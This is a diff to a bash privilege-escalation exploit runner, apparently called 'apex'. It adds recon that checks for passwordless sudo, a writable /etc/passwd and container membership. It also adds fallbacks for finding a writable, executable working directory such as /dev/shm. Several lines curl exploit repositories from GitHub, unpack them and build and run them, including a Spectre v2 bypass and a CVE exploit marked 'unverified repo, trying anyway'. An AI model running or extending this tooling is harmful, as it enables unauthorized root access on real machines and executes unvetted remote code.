@@ -16,6 +16,7 @@ CLEANUP=0
 NO_COPYFAIL=0
 DO_SCAN=0
 DO_SCAN_ONLY=0
+WORKDIR=""
 for A in "$@"; do
     case "$A" in
         -q|--quiet) QUIET=1 ;;
@@ -23,13 +24,15 @@ for A in "$@"; do
         --no-copyfail) NO_COPYFAIL=1 ;;
         --scan) DO_SCAN=1 ;;
         --scan-only) DO_SCAN=1; DO_SCAN_ONLY=1 ;;
+        --workdir) shift; WORKDIR="$1" ;;
         -h|--help)
             echo "Usage: $0 [flags]"
-            echo "  --scan         run read-only enumeration, then all exploits"
-            echo "  --scan-only    run enumeration only (no exploits, no traces)"
-            echo "  -q --quiet     compact output"
-            echo "  --cleanup      remove workdir when done"
-            echo "  --no-copyfail  skip the copy.fail payload"
+            echo "  --scan            run read-only enumeration, then all exploits"
+            echo "  --scan-only       run enumeration only (no exploits, no traces)"
+            echo "  -q --quiet        compact output"
+            echo "  --cleanup         remove workdir when done"
+            echo "  --no-copyfail     skip the copy.fail payload"
+            echo "  --workdir /path   force a specific writable+executable dir"
             exit 0 ;;
     esac
 done
@@ -114,21 +117,34 @@ is_exec_dir() {
 }
 
 find_workdir() {
-    local base
-    if [ -n "${HOME:-}" ] && [ "$HOME" != "/" ]; then base="$HOME/.cache/apex"; else base="/var/tmp/apex"; fi
-    for d in "$base" "/var/tmp/apex" "/dev/shm/apex" "/tmp/apex"; do
+    local d
+    for d in "$PWD" "${TMPDIR:-}" "$HOME/.cache/apex" "/var/tmp/apex" "/dev/shm/apex" "/tmp/apex"; do
+        [ -n "$d" ] || continue
         if is_exec_dir "$d"; then echo "$d"; return 0; fi
+        if [ -d "$d" ] || mkdir -p "$d" 2>/dev/null; then
+            [ -w "$d" ] || warn "workdir $d: not writable"
+            local t="$d/.x_$$"
+            printf '#!/bin/sh\nexit 0\n' > "$t" 2>/dev/null && chmod +x "$t" 2>/dev/null
+            "$t" 2>/dev/null || warn "workdir $d: noexec"
+            rm -f "$t" 2>/dev/null
+        else
+            warn "workdir $d: not creatable"
+        fi
     done
     return 1
 }
 
-WRK=$(find_workdir) || { echo -e "${RED}[-] no writable+executable dir found${NC}"; exit 1; }
+if [ -n "$WORKDIR" ]; then
+    WRK="$WORKDIR"
+else
+    WRK=$(find_workdir) || { echo -e "${RED}[-] no writable+executable dir found${NC}"; echo -e "${YELLOW}[-] hint: run with --workdir \$PWD${NC}"; exit 1; }
+fi
 LOGFILE=$WRK/exploit.log
 SUM=$WRK/summary.txt
-mkdir -p "$WRK"
+mkdir -p "$WRK" 2>/dev/null || { echo -e "${RED}[-] cannot create workdir $WRK${NC}"; exit 1; }
 : > "$LOGFILE"
 : > "$SUM"
-cd "$WRK"
+cd "$WRK" 2>/dev/null || { echo -e "${RED}[-] cannot cd to $WRK${NC}"; exit 1; }
 echo -e "${CYAN}[WORKDIR] $WRK${NC}"
 echo ""
 
@@ -146,12 +162,17 @@ fetch_repo() {
             return 0
         fi
     fi
-    if curl -fsSL "https://codeload.github.com/$repo/tar.gz/refs/heads/main" -o "$dir.tgz" 2>/dev/null; then
-        mkdir -p "$dir" && tar xzf "$dir.tgz" -C "$dir" --strip-components=1 2>/dev/null && rm -f "$dir.tgz"
-        return 0
-    fi
+    local br
+    for br in main master; do
+        if curl -fsSL "https://codeload.github.com/$repo/tar.gz/refs/heads/$br" -o "$dir.tgz" 2>/dev/null; then
+            mkdir -p "$dir" && tar xzf "$dir.tgz" -C "$dir" --strip-components=1 2>/dev/null && rm -f "$dir.tgz"
+            return 0
+        fi
+    done
     return 1
 }
+
+# zip extraction must be inline (run() executes in a fresh bash without our functions/vars)
 
 # --- kernel version compare ---
 knum() { echo "$1" | awk -F. '{printf "%d%02d", $1, $2}'; }
@@ -212,8 +233,11 @@ run() {
             wait $PID 2>/dev/null
             RC=$?
         fi
-    else
+    elif [ "$HAS_TIMEOUT" = "1" ]; then
         timeout -k 5 90 bash -c "$cmd" </dev/null >"$OUT" 2>&1
+        RC=$?
+    else
+        bash -c "$cmd" </dev/null >"$OUT" 2>&1
         RC=$?
     fi
     if [ "$QUIET" = "0" ]; then
@@ -292,6 +316,21 @@ if [ "$DO_SCAN" = "1" ]; then
         [ "$CLEANUP" = "1" ] && rm -rf "$WRK"
         exit 0
     fi
+fi
+
+# ===== INLINE QUICK RECON (default runs) =====
+if [ "$DO_SCAN" = "0" ]; then
+    echo -e "${CYAN}[QUICK RECON]${NC}"
+    if command -v sudo >/dev/null 2>&1 && sudo -n -l 2>/dev/null | grep -qE "NOPASSWD|\(ALL"; then
+        note "sudo available without password"
+    else
+        warn "no NOPASSWD sudo"
+    fi
+    [ -w /etc/passwd ] && note "/etc/passwd is writable!" || warn "/etc/passwd not writable"
+    if [ -f /.dockerenv ] || grep -qE "docker|kubepods|lxc" /proc/1/cgroup 2>/dev/null; then
+        note "running inside a container"
+    fi
+    echo ""
 fi
 
 # ===== TARGETS =====
@@ -375,7 +414,7 @@ fi
 # --- TONTOU (Spectre v2 bypass, AMD Zen 2) ---
 if echo "$CPU" | grep -qi "AMD.*Zen.2\|AMD.*Ryzen.*3[0-9]\|AMD.*EPYC.*7[0-9]"; then
     note "AMD Zen 2 -> TONTOU"
-    run "curl -fsSL https://github.com/CSAIL-Arch-Sec/tontou/archive/refs/heads/main.zip -o tontou.zip && unzip -oq tontou.zip && cd tontou-main && make && ./tontou" "TONTOU"
+    run "curl -fsSL https://github.com/CSAIL-Arch-Sec/tontou/archive/refs/heads/main.zip -o tontou.zip && mkdir -p .x && python3 -c 'import zipfile,sys; zipfile.ZipFile(sys.argv[1]).extractall(sys.argv[2])' tontou.zip .x && cd .x/tontou-main && make && ./tontou" "TONTOU"
 else
     warn "skip TONTOU (not AMD Zen 2)"
 fi
@@ -414,9 +453,9 @@ if lsmod 2>/dev/null | grep -q openvswitch || [ -d "/sys/module/openvswitch" ]; 
 fi
 
 # --- CVE-2026-31431 ---
-if [ "$HAS_UNZIP" = "1" ]; then
+if [ "$HAS_UNZIP" = "1" ] || python3 -c "import zipfile" 2>/dev/null; then
     warn "CVE-2026-31431: unverified repo, trying anyway"
-    run "curl -fsSL https://github.com/JuanBindez/CVE-2026-31431/archive/refs/heads/main.zip -o c31431.zip && unzip -oq c31431.zip && cd CVE-2026-31431-main && python3 main.py" "CVE-2026-31431"
+    run "curl -fsSL https://github.com/JuanBindez/CVE-2026-31431/archive/refs/heads/main.zip -o c31431.zip && mkdir -p .x && python3 -c 'import zipfile,sys; zipfile.ZipFile(sys.argv[1]).extractall(sys.argv[2])' c31431.zip .x && cd .x/CVE-2026-31431-main && python3 main.py" "CVE-2026-31431"
 fi
 
 # --- CVE-2026-46300 (hazir binary) ---
